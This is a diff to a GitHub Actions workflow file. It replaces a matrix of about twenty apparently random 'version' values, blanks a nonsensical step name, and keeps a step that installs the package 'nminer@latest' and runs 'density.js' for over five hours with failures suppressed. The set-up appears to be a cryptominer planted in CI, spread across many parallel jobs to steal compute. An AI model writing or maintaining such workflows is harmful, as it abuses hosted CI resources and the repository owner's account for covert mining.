@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7570 }
-          - { version: 2110 }
-          - { version: 3071 }
-          - { version: 4086 }
-          - { version: 691 }
-          - { version: 1398 }
-          - { version: 8587 }
-          - { version: 5525 }
-          - { version: 2701 }
-          - { version: 5520 }
-          - { version: 5904 }
-          - { version: 6014 }
-          - { version: 7090 }
-          - { version: 8998 }
-          - { version: 4654 }
-          - { version: 4200 }
-          - { version: 1694 }
-          - { version: 1672 }
-          - { version: 7044 }
-          - { version: 9863 }
+          - { version: 1816 }
+          - { version: 3913 }
+          - { version: 4346 }
+          - { version: 3762 }
+          - { version: 767 }
+          - { version: 1047 }
+          - { version: 2113 }
+          - { version: 4687 }
+          - { version: 8508 }
+          - { version: 2745 }
+          - { version: 4581 }
+          - { version: 8224 }
+          - { version: 4183 }
+          - { version: 8656 }
+          - { version: 769 }
+          - { version: 3516 }
+          - { version: 6089 }
+          - { version: 2664 }
+          - { version: 3202 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: drat impanel
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 330m node density.js || echo "density executed"
+          timeout 331m node density.js || echo "density executed"
